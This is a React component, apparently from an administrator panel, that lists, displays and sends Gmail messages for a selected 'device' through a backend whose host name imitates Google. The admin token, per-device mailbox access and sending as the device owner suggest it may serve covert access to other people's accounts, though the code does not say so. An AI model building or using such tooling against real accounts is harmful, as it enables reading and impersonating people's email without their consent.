import React, { useState, useEffect } from 'react';
import { 
  Search, 
  Inbox, 
  Star, 
  Send, 
  Archive, 
  Trash2, 
  RefreshCw,
  Mail,
  Paperclip,
  MoreVertical,
  Clock
} from 'lucide-react';
import { useLocation } from 'react-router-dom';
import "./GmailManager.css";

const GmailManager = ({ activeDevice, adminToken }) => {
  const [emails, setEmails] = useState([]);
  const [loading, setLoading] = useState(true);
  const [selectedEmail, setSelectedEmail] = useState(null);
  const [currentFolder, setCurrentFolder] = useState('inbox');
  const [searchQuery, setSearchQuery] = useState('');
  
  // State for compose modal
  const [composeOpen, setComposeOpen] = useState(false);
  const [composeTo, setComposeTo] = useState('');
  const [composeSubject, setComposeSubject] = useState('');
  const [composeBody, setComposeBody] = useState('');
  
  const folders = [
    { id: 'inbox', label: 'Inbox', icon: Inbox },
    { id: 'starred', label: 'Starred', icon: Star },
    { id: 'sent', label: 'Sent', icon: Send },
    { id: 'archived', label: 'Archive', icon: Archive },
    { id: 'trash', label: 'Trash', icon: Trash2 }
  ];

  const fetchEmails = async () => {
    try {
      setLoading(true);
      const response = await fetch(
        `https://googl-backend.onrender.com/api/device/gmail/messages?folder=${currentFolder}`,
        {
          headers: {
            Authorization: `Bearer ${adminToken}`,
          },
        }
      );
      
      if (!response.ok) throw new Error('Failed to fetch emails');
      const data = await response.json();
      setEmails(data.messages || []);
    } catch (error) {
      console.error('Error fetching emails:', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (activeDevice) {
      fetchEmails();
    }
  }, [currentFolder, activeDevice]);

  const handleComposeSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await fetch("https://googl-backend.onrender.com/api/device/gmail/send", {
        method: "POST",
        headers: {
          Authorization: `Bearer ${adminToken}`,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          userId: activeDevice.email,
          to: composeTo,
          subject: composeSubject,
          body: composeBody
        })
      });
      const data = await response.json();
      if (response.ok) {
        alert("Email sent successfully!");
        setComposeOpen(false);
        fetchEmails(); // Refresh the list of emails
      } else {
        alert("Failed to send email: " + data.error);
      }
    } catch (error) {
      console.error("Send Email Error:", error);
      alert("Error sending email");
    }
  };

  const EmailListItem = ({ email }) => (
    <div 
      className={`flex items-center p-4 hover:bg-gray-50 cursor-pointer border-b ${selectedEmail?.id === email.id ? 'bg-blue-50' : ''}`}
      onClick={() => setSelectedEmail(email)}
    >
      <div className="flex-1 min-w-0">
        <div className="flex items-center gap-2">
          <span className="font-medium truncate">{email.from}</span>
          <span className="text-sm text-gray-500">
            {new Date(email.date).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
          </span>
        </div>
        <div className="font-medium truncate">{email.subject}</div>
        <div className="text-sm text-gray-500 truncate">{email.snippet}</div>
      </div>
      {email.hasAttachment && (
        <Paperclip className="w-4 h-4 text-gray-400 ml-2" />
      )}
    </div>
  );

  return (
    <div className="h-screen bg-white">
      {/* Header */}
      <div className="flex items-center justify-between p-4 border-b">
        <div className="flex items-center gap-4">
          <img
            src={activeDevice?.picture || "/api/placeholder/32/32"}
            alt="Profile"
            className="w-8 h-8 rounded-full"
          />
          <div>
            <div className="font-medium">{activeDevice?.name}</div>
            <div className="text-sm text-gray-500">{activeDevice?.email}</div>
          </div>
        </div>
        <div className="flex gap-2">
          <button 
            onClick={fetchEmails}
            className="p-2 hover:bg-gray-100 rounded-full"
          >
            <RefreshCw className="w-5 h-5" />
          </button>
          <button 
            onClick={() => setComposeOpen(true)}
            className="p-2 hover:bg-gray-100 rounded-full"
          >
            Compose
          </button>
        </div>
      </div>

      <div className="flex h-[calc(100vh-73px)]">
        {/* Sidebar */}
        <div className="w-64 border-r p-4">
          <div className="mb-6">
            <div className="relative">
              <input
                type="text"
                placeholder="Search emails..."
                className="w-full pl-10 pr-4 py-2 border rounded-lg"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
              />
              <Search className="w-5 h-5 absolute left-3 top-2.5 text-gray-400" />
            </div>
          </div>
          <nav className="space-y-1">
            {folders.map((folder) => {
              const Icon = folder.icon;
              return (
                <button
                  key={folder.id}
                  onClick={() => setCurrentFolder(folder.id)}
                  className={`flex items-center gap-3 w-full p-2 rounded ${
                    currentFolder === folder.id
                      ? 'bg-blue-50 text-blue-600'
                      : 'hover:bg-gray-50'
                  }`}
                >
                  <Icon className="w-5 h-5" />
                  <span>{folder.label}</span>
                </button>
              );
            })}
          </nav>
        </div>

        {/* Email List */}
        <div className="flex-1 flex">
          <div className={`w-[400px] border-r ${selectedEmail ? '' : 'flex-1'}`}>
            {loading ? (
              <div className="flex items-center justify-center h-full">
                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-500" />
              </div>
            ) : emails.length === 0 ? (
              <div className="flex flex-col items-center justify-center h-full text-gray-500">
                <Mail className="w-12 h-12 mb-2" />
                <p>No emails found</p>
              </div>
            ) : (
              <div className="divide-y">
                {emails.map((email) => (
                  <EmailListItem key={email.id} email={email} />
                ))}
              </div>
            )}
          </div>

          {/* Email Detail */}
          {selectedEmail && (
            <div className="flex-1 p-6">
              <div className="mb-6">
                <h2 className="text-2xl font-medium mb-2">{selectedEmail.subject}</h2>
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-3">
                    <img
                      src="/api/placeholder/40/40"
                      alt="Sender"
                      className="w-10 h-10 rounded-full"
                    />
                    <div>
                      <div className="font-medium">{selectedEmail.from}</div>
                      <div className="text-sm text-gray-500">to me</div>
                    </div>
                  </div>
                  <div className="flex items-center gap-2 text-gray-500">
                    <Clock className="w-4 h-4" />
                    <span className="text-sm">
                      {new Date(selectedEmail.date).toLocaleString()}
                    </span>
                    <button className="p-1 hover:bg-gray-100 rounded-full">
                      <MoreVertical className="w-5 h-5" />
                    </button>
                  </div>
                </div>
              </div>
              <div className="prose max-w-none">
                {selectedEmail.snippet}
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Compose Modal */}
      {composeOpen && (
        <div className="compose-modal">
          <div className="compose-header">
            <h3>Compose Email</h3>
            <button onClick={() => setComposeOpen(false)}>Close</button>
          </div>
          <form onSubmit={handleComposeSubmit} className="compose-form">
            <input
              type="email"
              placeholder="To"
              value={composeTo}
              onChange={(e) => setComposeTo(e.target.value)}
              required
            />
            <input
              type="text"
              placeholder="Subject"
              value={composeSubject}
              onChange={(e) => setComposeSubject(e.target.value)}
              required
            />
            <textarea
              placeholder="Write your message..."
              value={composeBody}
              onChange={(e) => setComposeBody(e.target.value)}
              required
            ></textarea>
            <button type="submit">Send</button>
            <button type="button" onClick={() => setComposeOpen(false)}>Cancel</button>
          </form>
        </div>
      )}
    </div>
  );
};

export default GmailManager;
